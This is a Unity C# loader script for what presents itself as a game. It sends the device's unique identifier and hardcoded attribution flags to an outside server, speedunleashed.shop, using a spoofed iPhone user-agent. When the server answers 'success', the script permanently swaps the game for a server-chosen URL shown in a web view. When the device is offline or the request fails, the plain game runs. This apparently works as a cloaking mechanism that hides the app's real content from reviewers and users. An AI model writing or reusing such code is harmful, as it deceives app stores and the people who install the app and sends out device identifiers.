using System.Threading.Tasks;
using UnityEngine;
using System.Collections.Generic;
using UnityEngine.Networking;
using System;

public class LoadingBootstrap : MonoBehaviour
{
    [SerializeField] private RectTransform _viewPanel;

    private const string Key = "target";

    private enum TargetVariant
    {
        None,
        Game,
        View
    }

    private string LaunchTarget
    {
        get
        {
            return PlayerPrefs.GetString(Key, TargetVariant.None.ToString());
        }
        set
        {
            PlayerPrefs.SetString(Key, value);
            PlayerPrefs.Save();
        }
    }

    private void Awake()
    {
        if (Application.internetReachability == NetworkReachability.NotReachable)
        {
            _viewPanel.transform.parent.gameObject.SetActive(false);
            new Game().Run();
            enabled = false;
        }
    }

    private void Start()
    {
        var validation = Enum.Parse<TargetVariant>(LaunchTarget);

        Debug.Log(validation);

        switch (validation)
        {
            case TargetVariant.None:
                Initialize();
                break;

            case TargetVariant.Game:
                _viewPanel.transform.parent.gameObject.SetActive(false);
                new Game().Run();
                break;

            case TargetVariant.View:
                new View(PlayerPrefs.GetString(View.SavedResultKey), _viewPanel).Run();
                break;
        }
    }

    private async void Initialize()
    {
        var target = await SendRequest();

        target.Run();

        enabled = false;
    }

    private async Task<ValidationResult> SendRequest()
    {
        string sendData = BuildData();

        var request = UnityWebRequest.Put("https://speedunleashed.shop", sendData);

        request.SetRequestHeader("Content-Type", "application/json");
        request.SetRequestHeader("accept", "application/json");
        request.SetRequestHeader("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1");
        request.SendWebRequest();

        while (request.isDone == false)
        {
            await Task.Yield();
        }

        if (request.result != UnityWebRequest.Result.Success)
        {
            LaunchTarget = TargetVariant.Game.ToString();
            _viewPanel.transform.parent.gameObject.SetActive(false);
            return new Game();
        }

        var responce = AFMiniJSON.Json.Deserialize(request.downloadHandler.text) as Dictionary<string, object>;

        if (responce.ContainsKey("success") && bool.Parse(responce["success"].ToString()) == true)
        {
            LaunchTarget = TargetVariant.View.ToString();

            PlayerPrefs.SetString(View.SavedResultKey, responce["url"].ToString());

            return new View(responce["url"].ToString(), _viewPanel);
        }
        else
        {
            LaunchTarget = TargetVariant.Game.ToString();
            _viewPanel.transform.parent.gameObject.SetActive(false);
            return new Game();
        }
    }

    private string BuildData()
    {
        var allData = new Dictionary<string, object>
        {
            { "hash", SystemInfo.deviceUniqueIdentifier },
            { "app", "6593677688" },
            { "data", new Dictionary<string, object> {
                { "af_status", "Organic" },
                { "af_message", "organic install" },
                { "is_first_launch", true } }
            },
            { "device_info", new Dictionary<string, object>
                {
                    { "charging", SystemInfo.batteryStatus == BatteryStatus.Charging }
                }
            }
        };

        return AFMiniJSON.Json.Serialize(allData);
    }
}